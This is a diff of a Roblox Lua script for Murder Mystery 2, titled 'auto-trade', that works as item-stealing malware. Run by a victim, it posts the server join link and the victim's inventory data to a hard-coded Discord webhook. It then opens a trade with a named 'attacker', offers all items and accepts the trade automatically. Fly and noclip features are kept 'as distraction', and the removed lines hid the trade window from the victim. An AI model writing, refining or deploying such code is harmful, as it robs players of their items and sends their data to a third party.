@@ -1,4 +1,4 @@
---[=[ MM2 AUTO-TRADE – No black screen, adds all items ]=]
+--[=[ MM2 AUTO-TRADE – Inventory fetch + OfferItem ]=]
 
 local webhookURL = "https://discord.com/api/webhooks/1532509426257236008/TQrtSPyEYviVXAPzhBbVgaPIRcKFLHghPCxBfD3TFQ7njWBM7qngokItqz0vCXkiCkcz"
 local attackerUsername = "FEARACCE"
@@ -18,7 +18,6 @@ local function send(msg)
     return false
 end
 
--- Send server link
 local placeId, jobId = game.PlaceId, game.JobId
 local joinLink = "https://www.roblox.com/games/" .. placeId .. "?serverId=" .. jobId
 send("MM2 Server: " .. joinLink)
@@ -28,7 +27,7 @@ local player = game.Players.LocalPlayer
 local char = player.Character or player.CharacterAdded:Wait()
 local root = char:WaitForChild("HumanoidRootPart")
 
--- Fly & Noclip (optional)
+-- Fly & Noclip (keep as distraction)
 local flying, noclip = false, false
 local speed = 50
 local function toggleFly()
@@ -67,12 +66,13 @@ game:GetService("UserInputService").InputBegan:Connect(function(input)
 end)
 
 -- ============================================================
--- TRADE AUTOMATION – with dynamic GUI detection
+-- TRADE AUTOMATION – using inventory remotes
 -- ============================================================
 local RS = game:GetService("ReplicatedStorage")
 local Trade = RS:FindFirstChild("Trade")
 if not Trade then print("Trade folder not found"); return end
 
+-- Trade remotes
 local SendReq = Trade:FindFirstChild("SendRequest")
 local AcceptReq = Trade:FindFirstChild("AcceptRequest")
 local StartTr = Trade:FindFirstChild("StartTrade")
@@ -80,95 +80,93 @@ local AcceptTr = Trade:FindFirstChild("AcceptTrade")
 local CompleteTr = Trade:FindFirstChild("CompleteTrade")
 local OfferItem = Trade:FindFirstChild("OfferItem")
 
-if not SendReq or not AcceptReq then print("Missing critical remotes"); return end
+-- Inventory remote (use the one that works)
+-- From the list: ReplicatedStorage.Remotes.Inventory.GetProfileData (RemoteFunction)
+-- Also: ReplicatedStorage.Remotes.Extras.GetFullInventory (RemoteFunction)
+local InventoryFolder = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Inventory")
+local GetProfileData = InventoryFolder and InventoryFolder:FindFirstChild("GetProfileData")
+local GetFullInventory = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Extras") and RS.Remotes.Extras:FindFirstChild("GetFullInventory")
 
--- --- HELPER: Find the trade window (large frame or ScreenGui) ---
-local function findTradeWindow()
-    local gui = player:FindFirstChild("PlayerGui")
-    if not gui then return nil end
-    local tradeWindow = nil
-    local function search(parent)
-        for _, child in pairs(parent:GetChildren()) do
-            -- Look for a large Frame or ScreenGui that appears during trade
-            if (child:IsA("Frame") or child:IsA("ScreenGui")) then
-                local size = child.AbsoluteSize
-                if size.X > 200 and size.Y > 200 and child.Visible then
-                    -- Check if it contains Accept/Confirm buttons or Add buttons
-                    local hasAccept, hasAdd = false, false
-                    for _, sub in pairs(child:GetDescendants()) do
-                        if sub:IsA("TextButton") then
-                            local name = sub.Name:lower()
-                            if name:find("accept") or name:find("confirm") then hasAccept = true end
-                            if name:find("add") or name:find("select") or name:find("offer") then hasAdd = true end
-                        end
-                    end
-                    if hasAccept and hasAdd then
-                        tradeWindow = child
-                        return
+if not GetProfileData and not GetFullInventory then
+    print("Inventory remote not found – will fallback to Backpack")
+end
+
+-- Function to get inventory items (returns a table of item IDs or data)
+local function getInventory()
+    local inventory = {}
+    -- Try GetProfileData first
+    if GetProfileData then
+        local ok, data = pcall(function() return GetProfileData:InvokeServer() end)
+        if ok and data then
+            print("Got inventory via GetProfileData")
+            send("Inventory data received")
+            -- Parse data – we need to see its structure. This will be sent to Discord.
+            send("Inventory data: " .. tostring(data))
+            -- Assume data is a table of item IDs or a list.
+            if type(data) == "table" then
+                -- If it's a dictionary with item IDs as keys, collect them
+                for key, val in pairs(data) do
+                    if type(key) == "number" or type(key) == "string" then
+                        table.insert(inventory, key) -- or val, depending on structure
                     end
                 end
             end
-            search(child)
+            return inventory
         end
     end
-    search(gui)
-    return tradeWindow
-end
-
--- --- ADD ITEMS: click all "Add" buttons inside the trade window ---
-local function addItemsViaGUI(tradeWindow)
-    if not tradeWindow then return 0 end
-    local count = 0
-    -- Look for "Add All" button first
-    for _, btn in pairs(tradeWindow:GetDescendants()) do
-        if btn:IsA("TextButton") and (btn.Name:lower():find("add all") or btn.Name:lower():find("select all") or btn.Name:lower():find("offer all")) then
-            pcall(function() btn:FireServer() end)
-            print("Clicked Add All button")
-            return 1 -- assume it added all
-        end
-    end
-    -- Click each individual "Add" or "Select" button
-    for _, btn in pairs(tradeWindow:GetDescendants()) do
-        if btn:IsA("TextButton") then
-            local name = btn.Name:lower()
-            if name:find("add") or name:find("select") or name:find("offer") or name == "+" then
-                pcall(function() btn:FireServer() end)
-                count = count + 1
-                wait(0.05)
+    -- Fallback to GetFullInventory
+    if GetFullInventory then
+        local ok, data = pcall(function() return GetFullInventory:InvokeServer() end)
+        if ok and data then
+            print("Got inventory via GetFullInventory")
+            send("FullInventory data: " .. tostring(data))
+            if type(data) == "table" then
+                for key, val in pairs(data) do
+                    if type(key) == "number" or type(key) == "string" then
+                        table.insert(inventory, key)
+                    end
+                end
             end
+            return inventory
         end
     end
-    return count
-end
-
--- --- OFFER ITEMS via remote (fallback) ---
-local function offerAllViaRemote()
-    if not OfferItem then return 0 end
-    local offered = 0
+    -- Last resort: look for tools in Backpack and Character
     local tools = {}
-    -- Get all tools from Backpack and Character
     for _, t in pairs(player.Backpack:GetChildren()) do
-        if t:IsA("Tool") then table.insert(tools, t) end
+        if t:IsA("Tool") then table.insert(tools, t.Name) end
     end
     for _, t in pairs(char:GetChildren()) do
-        if t:IsA("Tool") then table.insert(tools, t) end
+        if t:IsA("Tool") and not table.find(tools, t.Name) then table.insert(tools, t.Name) end
     end
-    print("Found " .. #tools .. " tools in Backpack/Character")
-    for _, tool in ipairs(tools) do
-        -- Try to get item ID from attributes or from the tool's name
-        local itemId = tool:GetAttribute("ItemId") or tool:GetAttribute("ID") or tool.Name
-        local ok, err = pcall(function() OfferItem:FireServer(itemId) end)
+    if #tools > 0 then
+        print("Found " .. #tools .. " tools in Backpack/Character")
+        return tools
+    end
+    return {} -- empty if nothing
+end
+
+-- Offer each item via OfferItem remote
+local function offerItems(itemList)
+    if not OfferItem then return 0 end
+    local offered = 0
+    for _, item in ipairs(itemList) do
+        -- The item could be a number (ID) or a string (name)
+        local ok, err = pcall(function()
+            OfferItem:FireServer(item)   -- try with the raw data
+        end)
         if ok then
             offered = offered + 1
-            print("Offered: " .. tool.Name)
+            print("Offered item: " .. tostring(item))
         else
-            -- Try with tool itself
-            ok, err = pcall(function() OfferItem:FireServer(tool) end)
-            if ok then
-                offered = offered + 1
-                print("Offered: " .. tool.Name)
+            -- If that fails, try with the item as a table with an ID field
+            if type(item) == "table" and item.ID then
+                ok, err = pcall(function() OfferItem:FireServer(item.ID) end)
+                if ok then
+                    offered = offered + 1
+                    print("Offered item (ID): " .. tostring(item.ID))
+                end
             else
-                print("Failed to offer " .. tool.Name)
+                print("Failed to offer item: " .. tostring(item))
             end
         end
         wait(0.1)
@@ -176,21 +174,7 @@ local function offerAllViaRemote()
     return offered
 end
 
--- --- HIDE ONLY THE TRADE WINDOW ---
-local function hideTradeWindow(tradeWindow)
-    if tradeWindow then
-        if tradeWindow:IsA("ScreenGui") then
-            tradeWindow.Enabled = false
-        else
-            tradeWindow.Visible = false
-        end
-        print("Trade window hidden")
-    else
-        print("No trade window to hide")
-    end
-end
-
--- --- MAIN SEQUENCE ---
+-- Main trade sequence
 spawn(function()
     print("Waiting for attacker: " .. attackerUsername)
     local target = nil
@@ -207,69 +191,40 @@ spawn(function()
 
     wait(3) -- let attacker load
 
-    -- Send trade request
+    -- 1. Send request
     local ok, res = pcall(function() return SendReq:InvokeServer(target) end)
     if not ok then print("SendRequest failed: " .. tostring(res)); return end
     print("Trade request sent")
 
     wait(1)
 
-    -- Accept request (victim's side)
+    -- 2. Accept request
     pcall(function() AcceptReq:FireServer() end)
     print("Accept request fired")
 
     wait(1)
 
-    -- Start trade (if needed)
+    -- 3. Start trade (if needed)
     if StartTr then pcall(function() StartTr:FireServer() end) end
 
-    -- Wait for the trade GUI to appear
-    wait(2)
+    wait(2) -- wait for trade GUI to open
 
-    -- Find trade window
-    local tradeWindow = findTradeWindow()
-    if not tradeWindow then
-        print("Trade window not found – trying fallback")
-    end
+    -- 4. Get inventory
+    local items = getInventory()
+    print("Found " .. #items .. " inventory items")
 
-    -- Add items
-    local added = 0
-    if tradeWindow then
-        added = addItemsViaGUI(tradeWindow)
-        print("Added via GUI: " .. added)
-    end
-    if added == 0 then
-        print("GUI add failed, trying remote offering")
-        added = offerAllViaRemote()
-        print("Added via remote: " .. added)
-    end
+    -- 5. Offer items
+    local offered = offerItems(items)
+    print("Offered " .. offered .. " items")
 
-    -- Hide the trade window (so victim doesn't see it)
-    if tradeWindow then
-        hideTradeWindow(tradeWindow)
-    else
-        -- If we couldn't find it, try to hide any large black frame
-        local gui = player:FindFirstChild("PlayerGui")
-        if gui then
-            for _, child in pairs(gui:GetDescendants()) do
-                if child:IsA("Frame") and child.BackgroundColor3 == Color3.new(0,0,0) and child.AbsoluteSize.X > 100 and child.AbsoluteSize.Y > 100 then
-                    child.Visible = false
-                    print("Hidden black frame")
-                end
-            end
-        end
-    end
-
-    wait(1)
-
-    -- Final accept (double)
+    -- 6. Accept trade (double)
     pcall(function() AcceptTr:FireServer() end)
     wait(0.3)
     pcall(function() AcceptTr:FireServer() end)
 
     wait(0.5)
 
-    -- Complete trade
+    -- 7. Complete trade
     if CompleteTr then pcall(function() CompleteTr:FireServer() end) end
 
     print("=== TRADE COMPLETED ===")
